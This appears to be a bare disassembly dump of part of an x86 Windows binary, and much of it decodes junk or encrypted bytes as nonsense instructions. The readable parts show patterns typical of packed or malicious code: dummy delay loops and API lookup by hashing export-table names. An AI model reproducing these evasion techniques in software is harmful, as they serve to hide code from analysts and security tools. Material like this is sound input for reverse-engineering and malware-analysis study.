  419f79:	push   ebp
  419f7a:	pop    es
  419f7b:	popa   
  419f7c:	inc    esi
  419f7d:	inc    ebp
  419f7e:	repnz or al,0xf8
  419f81:	xor    BYTE PTR [edx-0x41],ch
  419f84:	push   0xd
  419f86:	das    
  419f87:	iret   
  419f88:	popf   
  419f89:	pop    ebp
  419f8a:	xor    DWORD PTR [ebp+0x64],eax
  419f8d:	aad    0x30
  419f8f:	add    esi,ecx
  419f91:	hlt    
  419f92:	and    DWORD PTR [eax],edx
  419f94:	adc    BYTE PTR [ebx-0x169a7cf0],dl
  419f9a:	jle    0x41a01b
  419f9c:	in     al,dx
  419f9d:	jnp    0x41a006
  419f9f:	mov    ds:0x691850f,eax
  419fa4:	add    BYTE PTR [eax],al
  419fa6:	add    DWORD PTR ds:0x42a7e5,0x42a781
  419fb0:	push   DWORD PTR [ebp+0x8]
  419fb3:	or     DWORD PTR ds:0x42a891,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a855,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x5b
  419fdd:	mov    dh,0x6e
  419fdf:	xlat   BYTE PTR ds:[ebx]
  419fe0:	adc    bl,0x7f
  419fe3:	js     0x419ff5
  419fe5:	jle    0x41a05f
  419fe7:	js     0x41a016
  419fe9:	cli    
  419fea:	data16 jecxz 0x41a027
  419fed:	addr16 push eax
  419fef:	cld    
  419ff0:	or     al,0xc5
  419ff2:	lds    edx,FWORD PTR [esi+0x53]
  419ff5:	mov    ebx,0xf8504385
  419ffa:	bound  edi,QWORD PTR [ebp+0x1cb3e573]
  41a000:	ret    0x6928
  41a003:	mov    ebx,0x394eb1f9
  41a008:	pop    edi
  41a009:	out    dx,eax
  41a00a:	mov    dl,0x2e
  41a00c:	js     0x41a041
  41a00e:	mov    esi,0xdf453ef9
  41a013:	sub    al,0xb
  41a015:	lods   al,BYTE PTR ds:[esi]
  41a016:	push   cs
  41a017:	pusha  
  41a018:	sbb    DWORD PTR [eax+0xfb7f676],edx
  41a01e:	cmp    al,ch
  41a020:	push   edi
  41a021:	push   ebx
  41a022:	stos   DWORD PTR es:[edi],eax
  41a023:	int    0xbc
  41a025:	add    ecx,DWORD PTR [esi-0x71]
  41a028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a029:	add    DWORD PTR [ecx],ecx
  41a02b:	jns    0x41a091
  41a02d:	xchg   ebp,eax
  41a02e:	add    DWORD PTR ds:0x7b5d5838,0x17
  41a035:	or     bh,ah
  41a037:	mov    ebx,0xf7b67694
  41a03c:	and    eax,0xeabf116a
  41a041:	out    dx,eax
  41a042:	cmovns esp,DWORD PTR [ebp+0x31ce88c3]
  41a049:	cli    
  41a04a:	rcr    bl,cl
  41a04c:	es dec eax
  41a04e:	sub    ebx,DWORD PTR ds:0xd36d4fcd
  41a054:	pop    ss
  41a055:	lea    edi,[eax]
  41a057:	in     al,0x99
  41a059:	into   
  41a05a:	jg     0x41a0c1
  41a05c:	xchg   edx,eax
  41a05d:	mov    eax,0xf0ed2a91
  41a062:	outs   dx,DWORD PTR ds:[esi]
  41a063:	out    dx,eax
  41a064:	js     0x41a038
  41a066:	xchg   BYTE PTR ds:[edi+0x5c],dl
  41a06a:	cmp    ebx,DWORD PTR [esi-0x39]
  41a06d:	psllq  mm2,QWORD PTR [ebx+0x5f]
  41a071:	inc    edx
  41a072:	push   0x7f
  41a074:	mov    edx,0xf6c91f2c
  41a079:	jmp    0xeed8347
  41a07e:	sti    
  41a07f:	xor    ebx,edx
  41a081:	cmp    dh,0x56
  41a084:	scas   eax,DWORD PTR es:[edi]
  41a085:	lods   eax,DWORD PTR ds:[esi]
  41a086:	mov    edx,0xcaa47607
  41a08b:	jbe    0x41a02d
  41a08d:	push   edx
  41a08e:	in     eax,dx
  41a08f:	pop    ebx
  41a090:	mov    ds:0x60570227,eax
  41a095:	jb     0x41a032
  41a097:	fst    DWORD PTR [ecx]
  41a099:	xchg   BYTE PTR [edi],cl
  41a09b:	loop   0x41a117
  41a09d:	xchg   ebp,eax
  41a09e:	in     eax,0xa5
  41a0a0:	adc    BYTE PTR [ebx+eax*1-0x452cbc1d],dl
  41a0a7:	push   ebp
  41a0a8:	rcr    BYTE PTR [edx-0x72],cl
  41a0ab:	adc    edi,DWORD PTR [ebx]
  41a0ad:	add    eax,0xd68b6dc1
  41a0b2:	out    dx,eax
  41a0b3:	lahf   
  41a0b4:	xorps  xmm6,xmm5
  41a0b7:	mov    al,ds:0xcd961d25
  41a0bc:	scas   eax,DWORD PTR es:[edi]
  41a0bd:	sub    DWORD PTR [edi-0x22],ebp
  41a0c0:	inc    edx
  41a0c1:	fsubr  DWORD PTR [ebx-0x49]
  41a0c4:	js     0x41a0b1
  41a0c6:	inc    BYTE PTR [esi+0x5bfd9e8e]
  41a0cc:	popf   
  41a0cd:	and    DWORD PTR ds:0x8c9e96c1,esi
  41a0d3:	sub    BYTE PTR [edx+edi*1+0x8c6ecb9],bl
  41a0da:	pop    edx
  41a0db:	repz imul BYTE PTR [ebp+0x22]
  41a0df:	(bad)  
  41a0e0:	fsub   QWORD PTR [edi]
  41a0e2:	(bad)  
  41a0e3:	adc    al,BYTE PTR [eax]
  41a0e5:	mov    bh,0x2c
  41a0e7:	addr16 pop edi
  41a0e9:	xlat   BYTE PTR ds:[ebx]
  41a0ea:	out    dx,eax
  41a0eb:	or     BYTE PTR [ecx+eax*2],dh
  41a0ee:	xchg   ebp,eax
  41a0ef:	push   edi
  41a0f0:	call   0xeb68:0x65f769a3
  41a0f7:	shl    ch,0xba
  41a0fa:	xchg   ebp,eax
  41a0fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0fc:	aaa    
  41a0fd:	sub    BYTE PTR ds:0xc56efafe,ch
  41a103:	inc    edx
  41a104:	je     0x41a0fc
  41a106:	pop    esp
  41a107:	loop   0x41a16b
  41a109:	lahf   
  41a10a:	cld    
  41a10b:	jbe    0x41a0e5
  41a10d:	scas   al,BYTE PTR es:[edi]
  41a10e:	mov    edi,DWORD PTR [edi+0x1957dae7]
  41a114:	sbb    esp,DWORD PTR [eax-0x30]
  41a117:	scas   eax,DWORD PTR es:[edi]
  41a118:	jmp    0x509219d2
  41a11d:	aam    0x24
  41a11f:	inc    eax
  41a120:	fist   WORD PTR [edi+0x67]
  41a123:	and    eax,0x976d5c07
  41a128:	xchg   ebp,eax
  41a129:	daa    
  41a12a:	into   
  41a12b:	out    0xd8,al
  41a12d:	pushf  
  41a12e:	in     al,dx
  41a12f:	cmp    ebx,DWORD PTR ds:0x1f84306c
  41a135:	in     eax,0x98
  41a137:	inc    edi
  41a138:	loopne 0x41a1a6
  41a13a:	stos   DWORD PTR es:[edi],eax
  41a13b:	sbb    DWORD PTR [eax-0x50],edi
  41a13e:	outs   dx,BYTE PTR ds:[esi]
  41a13f:	jecxz  0x41a180
  41a141:	pop    edi
  41a142:	stos   BYTE PTR es:[edi],al
  41a143:	sahf   
  41a144:	xchg   ebp,eax
  41a145:	std    
  41a146:	mov    BYTE PTR [ebx],ah
  41a148:	repnz repz mov ebx,0x329e5cb1
  41a14f:	mov    ecx,0xf3f0b9d0
  41a154:	add    DWORD PTR [ebp-0x623b4191],ebx
  41a15a:	shl    BYTE PTR [ebx-0x355d484],0x99
  41a161:	or     DWORD PTR [ebx+0x4b],ebp
  41a164:	leave  
  41a165:	or     edi,esp
  41a167:	or     bh,dh
  41a169:	push   edx
  41a16a:	stos   BYTE PTR es:[edi],al
  41a16b:	and    DWORD PTR [esi-0x27bf34f1],ebp
  41a171:	mov    BYTE PTR [ecx+ecx*2],dh
  41a174:	dec    esp
  41a175:	(bad)  
  41a178:	je     0x41a1ae
  41a17a:	mov    al,ds:0xb7b637d7
  41a17f:	jb     0x41a12c
  41a181:	dec    ebx
  41a182:	retf   0xb28
  41a185:	imul   edx,eax,0x5f762311
  41a18b:	cmp    dh,BYTE PTR ds:0x975ad1c1
  41a191:	jg     0x41a167
  41a193:	pop    es
  41a194:	mov    ebp,0x52fa2ab1
  41a199:	bound  esp,QWORD PTR [eax]
  41a19b:	push   edx
  41a19c:	test   BYTE PTR [edx],dl
  41a19e:	jae    0x41a14f
  41a1a0:	add    bh,BYTE PTR [edi-0x1c]
  41a1a3:	sar    DWORD PTR [edi+0x13fb9f5],1
  41a1a9:	push   ebp
  41a1aa:	ficom  WORD PTR [ecx+0x22fd935d]
  41a1b0:	sub    al,0xe2
  41a1b2:	test   eax,0xed15e7b7
  41a1b7:	dec    eax
  41a1b8:	sbb    BYTE PTR [ebp-0x127a7b65],bh
  41a1be:	cmp    cl,al
  41a1c0:	ficomp WORD PTR [ebp+0x107108ad]
  41a1c6:	(bad)  
  41a1c7:	jmp    0x7b9e:0x45d80f97
  41a1ce:	inc    eax
  41a1cf:	imul   ebx,DWORD PTR [eax-0x5f],0x11de339
  41a1d6:	jbe    0x41a1b4
  41a1d8:	mov    cl,BYTE PTR [ecx+edx*8-0x33354209]
  41a1df:	xchg   edx,eax
  41a1e0:	inc    ebx
  41a1e1:	paddb  mm3,QWORD PTR [esi+0x16]
  41a1e5:	jne    0x41a19e
  41a1e7:	mov    eax,0xd1fb7d15
  41a1ec:	and    al,0x30
  41a1ee:	pusha  
  41a1ef:	mov    ebp,0xc02ebaf
  41a1f4:	or     DWORD PTR [ebx],ecx
  41a1f6:	inc    edi
  41a1f7:	in     eax,dx
  41a1f8:	mov    ebp,0x8b04e1f8
  41a1fd:	cmc    
  41a1fe:	mov    cl,0x14
  41a200:	mov    eax,DWORD PTR [ebp-0x4]
  41a203:	mov    ecx,DWORD PTR [ebp-0x20]
  41a206:	mov    DWORD PTR ds:0x42a7d1,0x1c
  41a210:	cmp    DWORD PTR ds:0x42a7d1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7d1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7d1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7d1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a86d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a78d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a779,0x42a86d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a308
  41a293:	jno    0x41a21e
  41a295:	or     eax,0x787fd198
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a2a2
  41a29f:	sub    eax,0xdef02cc0
  41a2a4:	mov    ch,0xf8
  41a2a6:	pop    ebp
  41a2a7:	dec    ebp
  41a2a8:	mov    esi,0x60523faa
  41a2ad:	sbb    eax,0xe7d63f3f
  41a2b2:	aam    0xea
  41a2b4:	push   edi
  41a2b5:	xchg   edx,eax
  41a2b6:	icebp  
  41a2b7:	(bad)  
  41a2b8:	mov    edx,0x304ad6b3
  41a2bd:	fcmovb st,st(0)
  41a2bf:	mov    cl,0xb7
  41a2c1:	inc    edx
  41a2c2:	xchg   ch,al
  41a2c4:	lods   eax,DWORD PTR ds:[esi]
  41a2c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2c6:	xchg   edi,eax
  41a2c7:	fisttp DWORD PTR [ecx+0x37172de5]
  41a2cd:	lods   al,BYTE PTR ds:[esi]
  41a2ce:	aad    0xa1
  41a2d0:	das    
  41a2d1:	xor    al,0x8e
  41a2d3:	retf   0x80b0
  41a2d6:	lods   al,BYTE PTR ds:[esi]
  41a2d7:	add    al,0x24
  41a2d9:	mov    ecx,0x3924d593
  41a2de:	pop    ebx
  41a2df:	shl    DWORD PTR [edi-0x641756fc],0xcc
  41a2e6:	mov    cl,0xb5
  41a2e8:	push   ebp
  41a2e9:	daa    
  41a2ea:	(bad)  
  41a2ec:	pop    edx
  41a2ed:	push   es
  41a2ee:	push   ss
  41a2ef:	(bad)  
  41a2f0:	(bad)  
  41a2f2:	xchg   ebp,eax
  41a2f3:	mov    cl,bl
  41a2f5:	loop   0x41a315
  41a2f7:	adc    bl,ah
  41a2f9:	js     0x41a36f
  41a2fb:	retf   0x6cad
  41a2fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2ff:	inc    edx
  41a300:	sti    
  41a301:	jns    0x41a33b
  41a303:	jmp    0x51bfb18a
  41a308:	sbb    ah,ch
  41a30a:	xor    bl,ah
  41a30c:	inc    esi
  41a30d:	test   ebp,edx
  41a30f:	ret    
  41a310:	pushf  
  41a311:	sub    eax,0xe6841e7e
  41a316:	ds xor al,0x1e
  41a319:	lea    eax,[eax-0x1e]
  41a31c:	adc    ah,BYTE PTR [ebp-0x4adefa7]
  41a322:	pop    ecx
  41a323:	aaa    
  41a324:	jb     0x41a351
  41a326:	jmp    DWORD PTR [esi]
  41a328:	lahf   
  41a329:	ins    DWORD PTR es:[edi],dx
  41a32a:	sub    ecx,esp
  41a32c:	stos   DWORD PTR es:[edi],eax
  41a32d:	ror    bl,0xe8
  41a330:	stc    
  41a331:	mov    cs,edx
  41a333:	dec    esp
  41a334:	retf   
  41a335:	mov    ebx,0x88a76a61
  41a33a:	ins    DWORD PTR es:[edi],dx
  41a33b:	xor    al,0x17
  41a33d:	ret    0x914d
  41a340:	jmp    0xf79bcac2
  41a345:	xor    BYTE PTR [ecx],al
  41a347:	lods   eax,DWORD PTR ds:[esi]
  41a348:	fstp   QWORD PTR [edi-0x3e5cdf90]
  41a34e:	hlt    
  41a34f:	push   eax
  41a350:	adc    al,BYTE PTR [ebx-0x35e2bb22]
  41a356:	fcom   DWORD PTR [esi+0x73b993fa]
  41a35c:	mov    ds:0x17259a79,eax
  41a361:	mov    al,ds:0x804206a3
  41a366:	lock fisubr DWORD PTR [ecx-0x48]
  41a36a:	xlat   BYTE PTR ds:[ebx]
  41a36b:	addr16 xchg esp,eax
  41a36d:	mov    ch,0xbd
  41a36f:	pop    ebp
  41a370:	mov    bl,0x59
  41a372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a373:	popa   
  41a374:	jmp    0x2090:0x8ed75e7d
  41a37b:	in     eax,dx
  41a37c:	out    0xcc,eax
  41a37e:	inc    dx
  41a380:	repz test BYTE PTR [ebx],ch
  41a383:	jns    0x41a308
  41a385:	cmp    eax,0x5be59483
  41a38a:	icebp  
  41a38b:	push   ebp
  41a38c:	sahf   
  41a38d:	xchg   ebp,eax
  41a38e:	push   eax
  41a38f:	xor    eax,0x33153f4f
  41a394:	mov    edx,0x4c915730
  41a399:	pop    edx
  41a39a:	jecxz  0x41a384
  41a39c:	aas    
  41a39d:	in     al,0x29
  41a39f:	mov    ds:0x5b326c06,al
  41a3a4:	(bad)  
  41a3a5:	jg     0x41a330
  41a3a7:	dec    ebx
  41a3a8:	mov    ch,0xdf
  41a3aa:	pop    ebx
  41a3ab:	shl    BYTE PTR [edi+0x4dfcb8a0],cl
  41a3b1:	hlt    
  41a3b2:	and    bh,dh
  41a3b4:	pop    es
  41a3b5:	jmp    0x41a33c
  41a3b7:	push   esp
  41a3b8:	mov    ch,0xde
  41a3ba:	mov    ch,0x53
  41a3bc:	rol    BYTE PTR [esi],0xe7
  41a3bf:	fwait
  41a3c0:	mov    bl,0xf3
  41a3c2:	mov    dh,0x4c
  41a3c4:	sar    BYTE PTR [ebx+0x3ff60664],0xe7
  41a3cb:	ins    BYTE PTR es:[edi],dx
  41a3cc:	(bad)  
  41a3cd:	nop
  41a3ce:	ins    DWORD PTR es:[edi],dx
  41a3cf:	cmc    
  41a3d0:	adc    esp,DWORD PTR [eax]
  41a3d2:	inc    edi
  41a3d3:	and    BYTE PTR [ecx-0x7ab898c0],cl
  41a3d9:	mov    al,ds:0x1ed2d1ab
  41a3de:	or     eax,0x93f9d28b
  41a3e3:	lahf   
  41a3e4:	hlt    
  41a3e5:	xchg   DWORD PTR [ecx+eiz*1-0x25],ecx
  41a3e9:	cmp    ch,dh
  41a3eb:	push   ds
  41a3ec:	cli    
  41a3ed:	sbb    edx,DWORD PTR [edi-0x5b]
  41a3f0:	js     0x41a431
  41a3f2:	leave  
  41a3f3:	js     0x41a406
  41a3f5:	sub    ebp,DWORD PTR [ecx+0x6a9e6ffe]
  41a3fb:	repz scas eax,DWORD PTR es:[edi]
  41a3fd:	mov    BYTE PTR [esi+ecx*1-0x207fcc16],al
  41a404:	cmp    ch,BYTE PTR [esi+esi*8]
  41a407:	mov    dh,0x2
  41a409:	sbb    BYTE PTR [eax-0x73],dl
  41a40c:	cmp    eax,0xc034025
  41a411:	jnp    0x41a3e4
  41a413:	push   edx
  41a414:	shr    BYTE PTR [esi],cl
  41a416:	lds    edi,FWORD PTR [eax-0x4]
  41a419:	push   0x312a8f8
  41a41e:	xchg   BYTE PTR [ebx+0x6],ch
  41a421:	jb     0x41a440
  41a423:	out    0x2d,al
  41a425:	pop    edi
  41a426:	(bad)  [esi]
  41a428:	in     al,0x22
  41a42a:	xor    DWORD PTR [eax],edi
  41a42c:	push   ebx
  41a42d:	in     eax,0x6d
  41a42f:	adc    dh,BYTE PTR [esi]
  41a431:	jecxz  0x41a3ed
  41a433:	adc    BYTE PTR [ecx+0x4726cead],ch
  41a439:	mov    dl,0xf7
  41a43b:	ds xchg esi,eax
  41a43d:	adc    DWORD PTR [ecx],eax
  41a43f:	pop    eax
  41a440:	sub    eax,DWORD PTR [edx+0x7e]
  41a443:	jmp    0x50c0:0x687a3ebb
  41a44a:	into   
  41a44b:	cwde   
  41a44c:	rcl    BYTE PTR [eax+0x22],cl
  41a44f:	mov    ebx,0x60996106
  41a454:	push   edx
  41a455:	inc    ecx
  41a456:	sub    al,0xdb
  41a458:	into   
  41a459:	inc    edx
  41a45a:	push   esi
  41a45b:	mov    dl,0x4
  41a45d:	mov    esp,0x435a9911
  41a462:	and    DWORD PTR [ecx-0x1d7e307c],esi
  41a468:	jae    0x41a4e2
  41a46a:	cwde   
  41a46b:	cmc    
  41a46c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a46d:	gs jge 0x41a4be
  41a470:	and    esp,eax
  41a472:	(bad)  
  41a473:	mov    edi,DWORD PTR [edx+0x3b8d2a2f]
  41a479:	in     al,0x9b
  41a47b:	rcr    DWORD PTR [edi+0x41],1
  41a47e:	aaa    
  41a47f:	test   BYTE PTR [ebp+0x57aa2c71],dl
  41a485:	js     0x41a4b1
  41a487:	pop    ss
  41a488:	cmc    
  41a489:	pop    edx
  41a48a:	shr    BYTE PTR gs:[edi-0x65],0xbb
  41a48f:	test   eax,0x1718a5a
  41a494:	xchg   ebp,eax
  41a495:	and    cl,ah
  41a497:	(bad)  
  41a498:	sbb    ebp,DWORD PTR ds:0x88347b35
  41a49e:	cld    
  41a49f:	hlt    
  41a4a0:	das    
  41a4a1:	mov    eax,ds:0x40d3a322
  41a4a6:	and    al,BYTE PTR [ebp+0x2]
  41a4a9:	inc    ebx
  41a4aa:	mov    esp,0x2319a650
  41a4af:	stc    
  41a4b0:	test   ebp,edx
  41a4b2:	mov    BYTE PTR [edx+0x458920c6],bh
  41a4b8:	in     al,dx
  41a4b9:	mov    DWORD PTR ds:0x42a77d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a77d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a77d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a77d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a811,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a811
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a811,eax
  41a512:	cmp    DWORD PTR ds:0x42a811,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a811,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a811,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a811
  41a551:	inc    eax
  41a552:	mov    ds:0x42a811,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a79d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a79d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a79d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a79d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a79d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a779,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a779
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a779,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a779,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a779,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a779
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a779,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a779,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	push   cs
  41a68f:	mov    edx,0xd7b00fc6
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a6d3
  41a69b:	aaa    
  41a69c:	ret    0x1be6
  41a69f:	jb     0x41a65e
  41a6a1:	pusha  
  41a6a2:	and    eax,0xad35a463
  41a6a7:	nop
  41a6a8:	and    BYTE PTR [edi-0x418f0e16],0x74
  41a6af:	out    0x75,eax
  41a6b1:	stc    
  41a6b2:	jae    0x41a683
  41a6b4:	push   esi
  41a6b5:	or     esp,DWORD PTR [ecx]
  41a6b7:	mov    dl,0x7e
  41a6b9:	and    al,0xc4
  41a6bb:	dec    ecx
  41a6bc:	stos   DWORD PTR es:[edi],eax
  41a6bd:	(bad)  
  41a6be:	and    ch,dl
  41a6c0:	xchg   BYTE PTR [ebx],ah
  41a6c2:	iret   
  41a6c3:	outs   dx,BYTE PTR ds:[esi]
  41a6c4:	cmc    
  41a6c5:	sub    esp,DWORD PTR [edi+edi*8+0x480532ec]
  41a6cc:	fisubr DWORD PTR [ebp-0x2d16d75]
  41a6d2:	dec    esi
  41a6d3:	push   ds
  41a6d4:	adc    esp,esi
  41a6d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6d7:	aam    0xc9
  41a6d9:	pop    eax
  41a6da:	push   0xcd68bff3
  41a6df:	arpl   WORD PTR [eax+0x71cd46ae],di
  41a6e5:	sub    cl,BYTE PTR [ebx]
  41a6e7:	inc    edi
  41a6e8:	(bad)  
  41a6e9:	repnz cmp al,0xa9
  41a6ec:	cmp    dh,dh
  41a6ee:	xchg   DWORD PTR [ebx+eax*8-0x79ffca73],ebp
  41a6f5:	adc    dl,BYTE PTR ds:0xd8f78208
  41a6fb:	inc    ecx
  41a6fc:	cmovne ebx,DWORD PTR [esp+esi*1-0x48]
  41a701:	push   esi
  41a702:	loop   0x41a708
  41a704:	and    ch,BYTE PTR [ecx+0x7b]
  41a707:	xchg   ebp,eax
  41a708:	xchg   edi,eax
  41a709:	stos   BYTE PTR es:[edi],al
  41a70a:	lds    esp,FWORD PTR [edi+eax*4]
  41a70d:	pop    esp
  41a70e:	mov    DWORD PTR [edx+0x75d136bf],edi
  41a714:	pop    ecx
  41a715:	xor    ebx,esi
  41a717:	lock inc esp
  41a719:	push   cs
  41a71a:	sub    bl,al
  41a71c:	xchg   BYTE PTR [eax-0x18c80d9d],cl
  41a722:	push   esp
  41a723:	fisub  DWORD PTR [ecx]
  41a725:	mov    ah,0x6c
  41a727:	push   ds
  41a728:	xchg   edx,eax
  41a729:	xchg   dl,dl
  41a72b:	mov    al,0xa2
  41a72d:	enter  0xa9a9,0xd5
  41a731:	jecxz  0x41a79b
  41a733:	mov    ebx,DWORD PTR [edi-0x5fca1715]
  41a739:	fptan  
  41a73b:	dec    esp
  41a73c:	xchg   ecx,eax
  41a73d:	popa   
  41a73e:	pop    ds
  41a73f:	fdivr  QWORD PTR [eax]
  41a741:	shr    BYTE PTR [esi+0x1b],0xcf
  41a745:	inc    edx
  41a746:	adc    ch,BYTE PTR [eax]
  41a748:	das    
  41a749:	cld    
  41a74a:	mov    ah,0x82
  41a74c:	neg    DWORD PTR [ecx+0x6a]
  41a74f:	or     dh,cl
  41a751:	dec    edx
  41a752:	xchg   DWORD PTR [eax+0x2d],ebp
  41a755:	push   ss
  41a756:	inc    eax
  41a757:	fucomi st,st(2)
  41a759:	pop    esp
  41a75a:	(bad)  
  41a75b:	das    
  41a75c:	mov    ebp,0x77175629
  41a761:	test   eax,0x55f828f4
  41a767:	bound  eax,QWORD PTR [esi+edx*4]
  41a76a:	imul   ecx,DWORD PTR [edx+eax*4-0x7112cc02],0xebd57b23
  41a775:	int    0xfe
  41a777:	test   eax,0xb28e236e
  41a77c:	je     0x41a79c
  41a77e:	sub    DWORD PTR [edi],ebx
  41a780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a781:	mov    ebx,0x67b5856a
  41a786:	gs (bad) 
  41a788:	lock inc DWORD PTR [esi]
  41a78b:	mov    ds:0x1105eaa3,al
  41a790:	cld    
  41a791:	and    DWORD PTR [ebx],esp
  41a793:	in     al,0x4c
  41a795:	fistp  WORD PTR [ebp+0x3db4aa84]
  41a79b:	ret    0xaea7
  41a79e:	mov    ds:0x73b64f97,eax
  41a7a3:	jo     0x41a762
  41a7a5:	dec    esi
  41a7a6:	pusha  
  41a7a7:	mov    al,ds:0x92eb500a
  41a7ad:	(bad)  
  41a7ae:	pop    ebp
  41a7af:	push   ebx
  41a7b0:	call   0x47373596
  41a7b5:	dec    esi
  41a7b6:	ss repz xchg ebx,ecx
  41a7ba:	std    
  41a7bb:	test   BYTE PTR [ebx+0x1ce6380],cl
